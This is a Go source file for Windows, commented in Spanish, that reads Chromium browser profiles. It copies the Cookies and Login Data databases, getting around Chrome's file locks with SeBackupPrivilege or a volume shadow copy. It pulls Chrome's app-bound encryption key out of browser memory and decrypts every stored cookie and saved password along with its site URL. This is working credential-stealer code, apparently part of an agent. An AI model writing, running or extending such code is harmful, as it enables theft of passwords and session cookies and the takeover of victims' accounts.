//go:build windows

package win32

import (
	"errors"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"golang.org/x/sys/windows"
)

// Cookie es una cookie de un perfil Chromium ya descifrada, con la URL de la
// página a la que pertenece.
type Cookie struct {
	Browser    string
	Profile    string
	Host       string
	Path       string
	Name       string
	Value      string
	URL        string
	Expires    time.Time
	Session    bool
	Secure     bool
	HTTPOnly   bool
	Locked     bool // v20 sin clave app-bound: valor no descifrable
	DecryptErr string
}

// Login es una credencial guardada en un Login Data.
type Login struct {
	Browser  string
	Profile  string
	Origin   string
	Username string
	Password string
	Error    string
}

// chromeEpoch es la diferencia en segundos entre 1601-01-01 y 1970-01-01.
// Chrome guarda microsegundos desde 1601.
const chromeEpoch = 11644473600

// ReadCookies abre la base Cookies del perfil y devuelve todas las filas con su
// URL. El valor se descifra con las claves del Local State; las cookies v20 sin
// clave app-bound se devuelven marcadas en vez de descartarse, para que la URL y
// el nombre lleguen igual.
func ReadCookies(profile ChromeProfile, keys ChromeKeys) ([]Cookie, error) {
	if profile.Cookies == "" {
		return nil, errors.New("chrome: el perfil no tiene base de cookies")
	}

	copied, cleanup, err := CopyBrowserDB(profile.Cookies)
	if err != nil {
		return nil, fmt.Errorf("chrome: cookies bloqueadas: %w", err)
	}
	defer cleanup()

	db, err := OpenSQLite(copied)
	if err != nil {
		return nil, err
	}
	tables, err := db.Tables()
	if err != nil {
		return nil, err
	}
	table, ok := tables["cookies"]
	if !ok {
		return nil, errors.New("chrome: tabla cookies ausente")
	}

	columns := ColumnNames(table.SQL)
	hostIndex := IndexOfColumn(columns, "host_key")
	nameIndex := IndexOfColumn(columns, "name")
	valueIndex := IndexOfColumn(columns, "value")
	blobIndex := IndexOfColumn(columns, "encrypted_value")
	pathIndex := IndexOfColumn(columns, "path")
	expiresIndex := IndexOfColumn(columns, "expires_utc")
	secureIndex := IndexOfColumn(columns, "is_secure")
	httpIndex := IndexOfColumn(columns, "is_httponly")
	schemeIndex := IndexOfColumn(columns, "source_scheme")

	if hostIndex < 0 || nameIndex < 0 || blobIndex < 0 {
		return nil, fmt.Errorf("chrome: esquema inesperado en cookies (%d columnas)", len(columns))
	}

	// Tope de filas: un perfil normal tiene miles; uno corrupto no puede
	// arrastrar al agente a leer un millón de registros.
	rows, err := db.ReadTable(table.RootPage, 100000)
	if err != nil {
		return nil, err
	}

	width := hostIndex
	for _, index := range []int{nameIndex, valueIndex, blobIndex, pathIndex, expiresIndex} {
		if index > width {
			width = index
		}
	}

	// Chrome 127+ cifra todo con la clave app-bound, que no se puede desenvolver
	// en disco. Se busca una vez en la memoria del navegador y se reutiliza para
	// todas las filas de este perfil.
	if len(keys.AppBound) != 32 && blobIndex >= 0 {
		if sample := firstAppBound(rows, blobIndex); sample != nil {
			if recovered, recoverErr := AppBoundKey(profile.Browser, sample); recoverErr == nil {
				keys.AppBound = recovered
			}
		}
	}

	out := make([]Cookie, 0, len(rows))
	for _, row := range rows {
		if len(row) <= width {
			continue
		}

		cookie := Cookie{
			Browser: profile.Browser,
			Profile: profile.Name,
			Host:    row[hostIndex].Text,
			Name:    row[nameIndex].Text,
			Path:    "/",
		}
		if cookie.Host == "" || cookie.Name == "" {
			continue
		}
		if pathIndex >= 0 && row[pathIndex].Text != "" {
			cookie.Path = row[pathIndex].Text
		}
		if secureIndex >= 0 {
			cookie.Secure = row[secureIndex].Int != 0
		}
		if httpIndex >= 0 {
			cookie.HTTPOnly = row[httpIndex].Int != 0
		}

		if expiresIndex >= 0 && row[expiresIndex].Int > 0 {
			cookie.Expires = chromeTime(row[expiresIndex].Int)
		} else {
			cookie.Session = true
		}

		cookie.URL = cookieURL(cookie.Host, cookie.Path, row, schemeIndex)

		if valueIndex >= 0 && row[valueIndex].Text != "" {
			cookie.Value = row[valueIndex].Text
		} else if blob := row[blobIndex].Blob; len(blob) > 0 {
			plain, decryptErr := DecryptChromeValueWith(blob, keys)
			if decryptErr != nil {
				cookie.DecryptErr = decryptErr.Error()
				cookie.Locked = isAppBound(blob)
			} else {
				cookie.Value = plain
				if cookie.Locked {
					cookie.Locked = false
				}
			}
		}
		out = append(out, cookie)
	}
	return out, nil
}

// ReadLogins abre el Login Data y devuelve cada credencial con su URL.
func ReadLogins(profile ChromeProfile, keys ChromeKeys) ([]Login, error) {
	if profile.LoginData == "" {
		return nil, errors.New("chrome: el perfil no tiene Login Data")
	}

	copied, cleanup, err := CopyBrowserDB(profile.LoginData)
	if err != nil {
		return nil, fmt.Errorf("chrome: Login Data bloqueado: %w", err)
	}
	defer cleanup()

	db, err := OpenSQLite(copied)
	if err != nil {
		return nil, err
	}
	tables, err := db.Tables()
	if err != nil {
		return nil, err
	}
	table, ok := tables["logins"]
	if !ok {
		return nil, errors.New("chrome: tabla logins ausente")
	}

	columns := ColumnNames(table.SQL)
	originIndex := IndexOfColumn(columns, "origin_url")
	userIndex := IndexOfColumn(columns, "username_value")
	passIndex := IndexOfColumn(columns, "password_value")
	if originIndex < 0 || userIndex < 0 || passIndex < 0 {
		return nil, errors.New("chrome: esquema inesperado en logins")
	}

	rows, err := db.ReadTable(table.RootPage, 20000)
	if err != nil {
		return nil, err
	}

	width := originIndex
	if userIndex > width {
		width = userIndex
	}
	if passIndex > width {
		width = passIndex
	}

	out := make([]Login, 0, len(rows))
	for _, row := range rows {
		if len(row) <= width {
			continue
		}
		entry := Login{
			Browser:  profile.Browser,
			Profile:  profile.Name,
			Origin:   row[originIndex].Text,
			Username: row[userIndex].Text,
		}
		if entry.Origin == "" && entry.Username == "" {
			continue
		}

		blob := row[passIndex].Blob
		if len(blob) == 0 {
			entry.Error = "sin contraseña guardada"
			out = append(out, entry)
			continue
		}
		plain, decryptErr := DecryptChromeValueWith(blob, keys)
		if decryptErr != nil {
			entry.Error = decryptErr.Error()
		} else {
			entry.Password = plain
		}
		out = append(out, entry)
	}
	return out, nil
}

// CopyBrowserDB copia una base SQLite de Chromium junto con sus sidecars a un
// temporal. Con el navegador cerrado basta una lectura normal; con el navegador
// abierto el original está bloqueado sin permiso de lectura y hay que pasar por
// una copia de sombra del volumen.
func CopyBrowserDB(src string) (string, func(), error) {
	name, cleanup, err := copyTemp(src)
	if err == nil {
		return name, cleanup, nil
	}

	shadow, shadowErr := CreateShadowCopy(src)
	if shadowErr != nil {
		return "", nil, err
	}
	defer shadow.Close()

	shadowSrc, pathErr := shadow.PathFor(src)
	if pathErr != nil {
		return "", nil, err
	}
	return copyTemp(shadowSrc)
}

// copyTemp copia el archivo y sus sidecars a un temporal y devuelve el nombre y
// la limpieza.
func copyTemp(src string) (string, func(), error) {
	out, err := os.CreateTemp("", "govoid_db_*.db")
	if err != nil {
		return "", nil, err
	}
	name := out.Name()
	cleanup := func() {
		for _, suffix := range []string{"", "-wal", "-journal"} {
			_ = os.Remove(name + suffix)
		}
	}

	if err := copyFileInto(src, out); err != nil {
		out.Close()
		cleanup()
		return "", nil, err
	}
	if err := out.Close(); err != nil {
		cleanup()
		return "", nil, err
	}

	for _, suffix := range []string{"-wal", "-journal"} {
		sidecar := src + suffix
		if info, statErr := os.Stat(sidecar); statErr == nil && info.Size() > 0 {
			_ = copyPath(sidecar, name+suffix)
		}
	}
	return name, cleanup, nil
}

func copyFileInto(src string, out *os.File) error {
	source, err := openSharedRead(src)
	if err != nil {
		return err
	}
	defer func() {
		_ = source.Close()
	}()
	_, err = io.Copy(out, source)
	return err
}

func copyPath(src, dst string) error {
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	if err := copyFileInto(src, out); err != nil {
		out.Close()
		_ = os.Remove(dst)
		return err
	}
	return out.Close()
}

// openSharedRead abre un archivo que otro proceso mantiene abierto. Chrome abre
// sus bases sin FILE_SHARE_READ, así que una lectura normal falla con
// "being used by another process"; con SeBackupPrivilege y
// FILE_FLAG_BACKUP_SEMANTICS el gestor de E/S salta esa comprobación.
func openSharedRead(path string) (*os.File, error) {
	_ = enablePrivilege("SeBackupPrivilege")

	name, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}

	handle, err := windows.CreateFile(name,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_SEQUENTIAL_SCAN,
		0)
	if err != nil {
		return os.Open(path)
	}
	return os.NewFile(uintptr(handle), path), nil
}

// chromeTime convierte microsegundos desde 1601 a tiempo local.
func chromeTime(micros int64) time.Time {
	seconds := micros/1000000 - chromeEpoch
	if seconds <= 0 {
		return time.Time{}
	}
	return time.Unix(seconds, 0)
}

// cookieURL arma la URL de la página de la que salió la cookie: esquema según
// source_scheme, host sin el punto inicial y el path de la cookie.
func cookieURL(host, path string, row []SQLiteValue, schemeIndex int) string {
	scheme := "https"
	if schemeIndex >= 0 && schemeIndex < len(row) && row[schemeIndex].Int == 1 {
		scheme = "http"
	}
	host = strings.TrimPrefix(host, ".")
	if host == "" {
		return ""
	}
	if path == "" {
		path = "/"
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return scheme + "://" + host + path
}

// isAppBound distingue un valor v20 (cifrado app-bound, necesita el servicio de
// elevación de Chrome) de un fallo de descifrado normal.
func isAppBound(blob []byte) bool {
	return len(blob) >= 3 && string(blob[:3]) == "v20"
}

// ColumnNames saca los nombres de columna del CREATE TABLE.
func ColumnNames(ddl string) []string {
	start := strings.Index(ddl, "(")
	end := strings.LastIndex(ddl, ")")
	if start < 0 || end <= start {
		return nil
	}
	inner := ddl[start+1 : end]

	names := make([]string, 0, 16)
	for _, part := range strings.Split(inner, ",") {
		fields := strings.Fields(strings.TrimSpace(part))
		if len(fields) == 0 {
			continue
		}
		name := strings.Trim(fields[0], "`\"[]")
		switch strings.ToUpper(name) {
		case "PRIMARY", "UNIQUE", "CONSTRAINT", "FOREIGN", "CHECK":
			continue
		}
		names = append(names, name)
	}
	return names
}

// IndexOfColumn devuelve la posición de una columna, o -1.
func IndexOfColumn(columns []string, target string) int {
	for index, value := range columns {
		if strings.EqualFold(value, target) {
			return index
		}
	}
	return -1
}
